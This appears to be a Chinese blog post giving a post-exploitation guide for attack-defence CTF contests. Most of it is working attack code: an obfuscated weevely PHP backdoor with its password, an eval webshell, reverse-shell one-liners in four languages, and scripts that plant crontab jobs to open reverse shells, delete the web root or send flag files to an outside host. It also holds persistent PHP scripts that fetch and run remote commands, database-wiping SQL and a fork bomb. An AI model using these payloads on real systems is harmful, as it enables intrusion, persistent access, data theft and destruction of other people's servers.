---
layout: post
category: CTF
title: Web选手的AWD后渗透指南
catalog: true
excerpt: 翻了下网上的AWD资料，发现大家都没有详细讲细节，AWD的资料还是不够开放与完善。在此，放一些个人对AWD运维和后渗透相关的总结。AWD比赛还是很好玩，希望大家从中学到知识的同时享受到对抗的快感。
time: 2018.08.21 14:35:00
tags:
- CTF
- AWD
- backdoor


---



# Web选手的AWD后渗透指南

在线下赛，我们常常为了维持权限以及运维自己服务的需求，会对Gamebox植入一些后门。这里对这些后门进行一个简单的汇总。

## 1. weevely后门

1. 优点在于混淆性高，其他选手很难通过分析代码获得weevely型后门的密钥。另外，weevely内置了一些基础的小功能，使用起来也相对方便。

2. 缺点便是通过php解析执行，执行速度较慢。

3. 生成weevely后门：

   ```bash
   # moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:10:27] C:2
   $ python weevely.py generate woaizhongguo weevely.php
   Generated backdoor with password 'woaizhongguo' in 'weevely.php' of 1469 byte size.
   
   # moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:10:50]
   $ cat weevely.php
   <?php
   $u='$kh="-Y6471";$kf="-Y2151-Y";f-Yunction -Yx($t,$-Yk)-Y{$c=-Yst-Yrle-Yn($k);$-Yl=strlen($t);$-Yo';
   $h='.$k-Yf),-Y0,3));$p=-Y"";f-Yor($z=1;-Y$z<coun-Yt($-Ym[1]);-Y$z++-Y)$-Yp.=$q-Y[$m-Y[2][$z]];if-Y(';
   $s='-Ys-Ytrpos(-Y$p,$h)===0){$s[-Y$i]="";$-Yp=$-Yss($p-Y,3);}if(a-Yrra-Yy_ke-Yy_exists($i,-Y$s)){$s[';
   $j=';}}re-Yturn $o-Y;-Y-Y}$r=$_SERVER-Y;$rr=@$r[-Y-Y"HTTP_REFER-YER"];$-Yra=@$r-Y[-Y"HT-YTP_ACC';
   $C='o-Y-Ympress(@x(-Y@b-Yase64_decode-Y(-Y-Ypreg_replace(a-Yrray("/-Y-Y_/","-Y/-/"-Y),array(-Y"/","+"),';
   $W=');$q=array_value-Ys-Y($q);preg_-Ymatch_all(-Y"-Y/([-Y\\w])[\\w-]+(?:-Y;q=0.(-Y-Y[\\d-Y]))?,-Y?/",';
   $G=str_replace('N','','cNNreate_NfNuncNtiNon');
   $c='$ra-Y,$m);if-Y($q-Y-Y&&$m){@s-Yession_start();$s=&$_-YSESS-YION;$ss-Y="subs-Ytr-Y";$-Ysl="-Ys';
   $e='tr-Ytolowe-Yr";$i=$-Ym[1][-Y0].$m[1][-Y1]-Y;$h=$sl($ss(md5($i.-Y$kh-Y),0,-Y3));$f=$sl($s-Ys(-Ymd5($i';
   $M='$i-Y].=$p;$e-Y=strpo-Ys($s-Y[$-Yi],$f);-Yif($e){$k-Y=-Y$-Ykh.$kf;ob_start-Y();@e-Yval(@gzunc';
   $f='-Y4_enc-Yode(x(g-Yzcompres-Y-Ys($o)-Y,$k));p-Yrint("<$k-Y>$d</-Y$-Yk>");@session_-Ydestro-Yy();}}}}';
   $B='$ss-Y($s[$i],-Y0,$e)))-Y,$-Yk)-Y)-Y);$o=ob_get_conten-Yts();ob-Y-Y_e-Ynd_clean();$d=ba-Yse6';
   $g='=""-Y;for($i=0;$i<$l;-Y){-Yfo-Yr($j=0;($j<$-Yc&&$i<-Y$l)-Y;$j-Y++,$i++)-Y{$o.=$t{$i-Y}^$k{$-Yj}';
   $x='-YEPT_LANGUAGE"];if-Y($-Yrr&&$ra)-Y{$u=p-Y-Yarse_-Yurl-Y($rr-Y);parse_str-Y($u["quer-Yy"]-Y-Y,$q';
   $S=str_replace('-Y','',$u.$g.$j.$x.$W.$c.$e.$h.$s.$M.$C.$B.$f);
   $o=$G('',$S);$o();
   ?>
   ```

4. 使用weevely后门

   将其上传到指定web目录后，使用方式如下:

   ```bash
   # moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:14:15]
   $ python weevely.py http://202.112.51.135:8801/Myself/weevely.php woaizhongguo
   
   [+] weevely 3.5
   
   [+] Target:	202.112.51.135:8801
   [+] Session:	/Users/moxiaoxi/.weevely/sessions/202.112.51.135/weevely_0.session
   
   [+] Browse the filesystem or execute commands starts the connection
   [+] to the target. Type :help for more information.
   
   weevely> ls
   antsword.php
   k.php
   reverse.php
   weevely.php
   www-data@9b275645e178:/var/www/html/Myself $ whoami
   www-data
   www-data@9b275645e178:/var/www/html/Myself $
   ```

   这样就能得到www-data的一个类shell界面。

5. load_session连接

   ```bash
   # moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:15:54] C:2
   $ python weevely.py session /Users/moxiaoxi/.weevely/sessions/202.112.51.135/weevely_0.session
   
   [+] weevely 3.5
   
   [+] Target:	202.112.51.135:8801
   [+] Session:	/Users/moxiaoxi/.weevely/sessions/202.112.51.135/weevely_0.session
   
   [+] Browse the filesystem or execute commands starts the connection
   [+] to the target. Type :help for more information.
   
   weevely> ls
   antsword.php
   k.php
   reverse.php
   weevely.php
   www-data@9b275645e178:/var/www/html/Myself $
   ```

   

## 2. 蚁剑及菜刀型后门

```php
<?php
$white_ip_list = array(
    '127.0.0.1',
    "::1"
);
$ip = $_SERVER['REMOTE_ADDR'];
if(count($white_ip_list)>0) {
    if (in_array($ip, $white_ip_list)) {
        $a = $_POST['moxiaoxi'];
        if (isset($a)) {
            eval($a);
        }
    }else{
        echo('IP:'.$ip);
    }
}
```

用以连接后，以Gui方式运维。

## 3. 反弹shell

在bash下可以运行： 

```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

 使用php：

```bash
php -r '$sock=fsockopen("127.0.0.1","4444");exec("/bin/sh -i <&3 >&3 2>&3");'
```

使用python:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

使用perl：

```perl
perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```



## 4. Crontab

- 查看定时任务

  `cat /etc/crontab*` 与`crontab -l`

- crontab备份

  ```crontab -l > $HOME/mycron```

- 删除crontab（www-data种植，www-data清理）

  ```
  crontab -r
  ```

- crontab执行任意命令

  ```python
  import base64
  def crontab_reverse(cmd):
      crontab_path = "/tmp"
      crontab_cmd = "* * * * * bash -c '%s'\n"%cmd
      encode_crontab_cmd = base64.b64encode(crontab_cmd)
      cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
      return cmd 
  ```

- crontab反弹shell

  ```python
  import base64
  def crontab_reverse(reverse_ip,reverse_port):
      crontab_path = "/tmp"
      cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
      crontab_cmd = "* * * * * bash -c '%s'\n"%cmd
      encode_crontab_cmd = base64.b64encode(crontab_cmd)
      cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
      return cmd 
  ```

  ```bash
  ubuntu@ubuntu-virtual-machine:~$ /bin/echo KiAqICogKiAqIGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzgwODAgMD4mMScK | /usr/bin/base64 -d | /bin/cat >> /tmp/tmp.conf ; /usr/bin/crontab /tmp/tmp.conf
  ubuntu@ubuntu-virtual-machine:~$
  ubuntu@ubuntu-virtual-machine:~$ crontab -l
  * * * * * bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'
  ```

- crontab删除文件

  ```python
  import base64
  def crontab_rm(rm_paths='/var/www/html/'):
      crontab_path = "/tmp"
      cmd = '/bin/rm -rf %s'%rm_paths
      crontab_cmd = "* * * * * %s\n"%cmd
      encode_crontab_cmd = base64.b64encode(crontab_cmd)
      cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
      return cmd
  ```

- crontab提交flag

  ```python
  import base64
  def crontab_flag_submit(flag_server,flag_port,flag_url,flag_token,flag_path):
      crontab_path = '/tmp'
      cmd = '/usr/bin/wget "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)" ' %(flag_server,flag_port,flag_url,flag_token,flag_path)
      crontab_cmd = "* * * * * %s\n"%cmd
      encode_crontab_cmd = base64.b64encode(crontab_cmd)
      cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
      return cmd
  
  cmd = crontab_flag_submit(flag_server='172.16.132.2',flag_port='8088',flag_url='submit',flag_token='bcbe3365e6ac95ea2c0343a2395834dd',flag_path='/flag')
  print(cmd)
  ```

  

- ...

## 4. PHP型内存马

内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。要杀死这种内存马，在root权限下只需要重启Apache或者nginx即可。而在线下赛中，我们往往没有root权限。因此，我们一般得通过www-data用户进行杀马。

>  杀马，kill -9 -1 杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；
>
> ps -aux\|grep 'www-data'\|awk '{print $2}'\|xargs kill -9

1. 回送flag+自动提交flag+回连任意代码执行

   ```php
   <?php
   $message="* * * * * curl 192.168.136.1:8098/?flag=$(cat /flag)&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY";
   ignore_user_abort(true);
   set_time_limit(0);
   while (true) {
       $x =file_get_contents('/flag');
   	file_get_contents('http://192.168.136.1:8099/test.php?token=moxiaoxi&flag='.$x);
       sleep(5);
       system("echo '$message' > /tmp/1 ;");
       system("crontab /tmp/1;");
       system("rm /tmp/1;");
       $c=file_get_contents('http://192.168.136.1:8100/1.txt');
       system($c);
   }
   ?>
   ```

2. 覆盖写

   ```php
   <?php
   ignore_user_abort(true);
   set_time_limit(0);
   while (1){
   	$path = "/var/www/html/css/.moxiaoxi2.php";
   	$data = "<?php @eval(\$_POST['moxiaoxi']);?>";
       @file_put_contents($path, $data);
       system('chmod 777 '.$path);
       usleep(100);
   }
   ?>
   ```

   > 这里讲一下二进制马，我至今还没找到那种可以动态变pid，而且执行速度超快的二进制马。所以，在当下看来，二进制马作用其实不大，因为所有的二进制马都可以通过杀死内存马的方式杀掉，就显得很鸡肋。如果后面发现了这种快速执行的骚马，可以拿出来讲一讲。

## 5. 其他

1. 数据库相关

   删除数据库

   ```python
   import base64
   def rm_db(db_user,my_db_passwd):
       cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
       db_name = ['performance_schema','mysql','flag']
       for db in db_name:
           cmd += "drop database %s;"%db
       cmd += "'"
       return cmd  
   ```

   修改用户信息

   ```sql
   update mysql.user set authentication_string=PASSWORD('hi23333');# 修改所有用户密码
   flush privileges;
   UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; 
   flush privileges;
   delete from mysql.user ;#删除所有用户
   flush privileges;
   ```

2. fork炸弹

   ```bash
   /bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;
   ```

3. 滥用杀死不死马脚本，不停kill apache2，造成dos

4. 大量发送长度超长的脚本，造成dos

5. mysql sleep型dos

6. 所有的正向shell可以自己写一段简单的python脚本进行控制与管理，而反向shell可以使用[王一航写的反向shell管理器](https://github.com/WangYihang/Reverse-Shell-Manager).现在的反向shell管理器还存在一些bug。

7. ....



